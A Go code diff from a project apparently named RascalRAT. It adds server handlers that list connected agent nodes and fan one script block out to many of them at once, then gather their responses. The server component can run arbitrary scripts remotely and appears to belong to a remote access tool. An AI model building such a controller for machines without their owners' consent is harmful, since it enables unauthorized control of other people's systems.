@@ -2,8 +2,11 @@ package ws
 
 import (
 	"context"
+	"crypto/rand"
+	"encoding/hex"
 	"errors"
 	"net/http"
+	"sync"
 	"time"
 
 	"log/slog"
@@ -12,6 +15,14 @@ import (
 	"github.com/its-ernest/RascalRAT/internal/protocol"
 	"github.com/labstack/echo/v5"
 )
+
+func newTaskID() string {
+	b := make([]byte, 6)
+	if _, err := rand.Read(b); err != nil {
+		return "task-" + time.Now().Format("150405.000")
+	}
+	return "task-" + hex.EncodeToString(b)
+}
 
 func AcceptAgentWebSocket(c *echo.Context, hub *Hub) error {
 	r := c.Request()
@@ -43,24 +54,18 @@ func AcceptAgentWebSocket(c *echo.Context, hub *Hub) error {
 	return nil
 }
 
-func DispatchTask(c *echo.Context, hub *Hub) error {
-	nodeID, err := echo.PathParam[string](c, "id")
-	if err != nil {
-		return c.JSON(http.StatusBadRequest, map[string]string{"error": "missing node target context"})
-	}
+// ListNodes returns the roster of currently connected agent nodes.
+func ListNodes(c *echo.Context, hub *Hub) error {
+	return c.JSON(http.StatusOK, hub.List())
+}
 
-	var req protocol.TaskRequest
-	if err := c.Bind(&req); err != nil {
-		return c.JSON(http.StatusBadRequest, map[string]string{"error": "malformed task request body"})
-	}
-
+// dispatchOne delivers a single task to one node and waits for its response.
+// It returns the response together with the HTTP status that should be
+// reported to the caller when this node is the sole target.
+func dispatchOne(hub *Hub, nodeID string, req protocol.TaskRequest) (protocol.TaskResponse, int, error) {
 	session, err := hub.GetSession(nodeID)
 	if err != nil {
-		return c.JSON(http.StatusNotFound, map[string]string{"error": err.Error()})
-	}
-
-	if req.TaskID == "" {
-		return c.JSON(http.StatusBadRequest, map[string]string{"error": "task_id is required for execution tracking"})
+		return protocol.TaskResponse{}, http.StatusNotFound, err
 	}
 
 	respChan := make(chan protocol.TaskResponse, 1)
@@ -71,19 +76,95 @@ func DispatchTask(c *echo.Context, hub *Hub) error {
 	case session.Send <- req:
 	default:
 		slog.Warn("send queue saturated", "node_id", nodeID, "task_id", req.TaskID)
-		return c.JSON(http.StatusServiceUnavailable, map[string]string{"error": "agent is currently busy"})
+		return protocol.TaskResponse{}, http.StatusServiceUnavailable, errors.New("agent is currently busy")
 	}
 
-	taskCtx, taskCancel := context.WithTimeout(c.Request().Context(), req.Timeout+2*time.Second)
+	taskCtx, taskCancel := context.WithTimeout(context.Background(), req.Timeout+2*time.Second)
 	defer taskCancel()
 
 	select {
 	case response := <-respChan:
-		return c.JSON(http.StatusOK, response)
+		return response, http.StatusOK, nil
 	case <-taskCtx.Done():
 		if errors.Is(taskCtx.Err(), context.DeadlineExceeded) {
-			return c.JSON(http.StatusGatewayTimeout, map[string]string{"error": "endpoint task execution exceeded specified timeout thresholds"})
+			return protocol.TaskResponse{}, http.StatusGatewayTimeout, errors.New("endpoint task execution exceeded specified timeout thresholds")
 		}
-		return c.JSON(http.StatusInternalServerError, map[string]string{"error": "request context cancelled during tracking"})
+		return protocol.TaskResponse{}, http.StatusInternalServerError, errors.New("request context cancelled during tracking")
 	}
+}
+
+func DispatchTask(c *echo.Context, hub *Hub) error {
+	nodeID, err := echo.PathParam[string](c, "id")
+	if err != nil {
+		return c.JSON(http.StatusBadRequest, map[string]string{"error": "missing node target context"})
+	}
+
+	var req protocol.TaskRequest
+	if err := c.Bind(&req); err != nil {
+		return c.JSON(http.StatusBadRequest, map[string]string{"error": "malformed task request body"})
+	}
+	if req.TaskID == "" {
+		req.TaskID = newTaskID()
+	}
+
+	resp, status, derr := dispatchOne(hub, nodeID, req)
+	if derr != nil {
+		return c.JSON(status, map[string]string{"error": derr.Error()})
+	}
+	return c.JSON(status, resp)
+}
+
+// MultiTaskRequest conveys one administrative instruction to many nodes at once.
+type MultiTaskRequest struct {
+	NodeIDs     []string      `json:"node_ids"`
+	PayloadType string        `json:"payload_type"`
+	ScriptBlock string        `json:"script_block"`
+	Timeout     time.Duration `json:"timeout"`
+}
+
+// DispatchTaskMulti fans a single task out to every selected node concurrently
+// and returns a per-node map of responses plus the status for each node.
+func DispatchTaskMulti(c *echo.Context, hub *Hub) error {
+	var req MultiTaskRequest
+	if err := c.Bind(&req); err != nil {
+		return c.JSON(http.StatusBadRequest, map[string]string{"error": "malformed task request body"})
+	}
+	if len(req.NodeIDs) == 0 {
+		return c.JSON(http.StatusBadRequest, map[string]string{"error": "node_ids is required"})
+	}
+
+	base := newTaskID()
+	responses := make(map[string]protocol.TaskResponse)
+	statuses := make(map[string]int)
+	var mu sync.Mutex
+	var wg sync.WaitGroup
+
+	for _, nodeID := range req.NodeIDs {
+		wg.Add(1)
+		go func(id string) {
+			defer wg.Done()
+
+			taskReq := protocol.TaskRequest{
+				TaskID:      base + "-" + id,
+				PayloadType: req.PayloadType,
+				ScriptBlock: req.ScriptBlock,
+				Timeout:     req.Timeout,
+			}
+
+			resp, status, derr := dispatchOne(hub, id, taskReq)
+
+			mu.Lock()
+			defer mu.Unlock()
+			if derr != nil {
+				responses[id] = protocol.TaskResponse{TaskID: taskReq.TaskID, Success: false, ErrorMessage: derr.Error()}
+				statuses[id] = status
+				return
+			}
+			responses[id] = resp
+			statuses[id] = status
+		}(nodeID)
+	}
+
+	wg.Wait()
+	return c.JSON(http.StatusOK, map[string]any{"responses": responses, "statuses": statuses})
 }
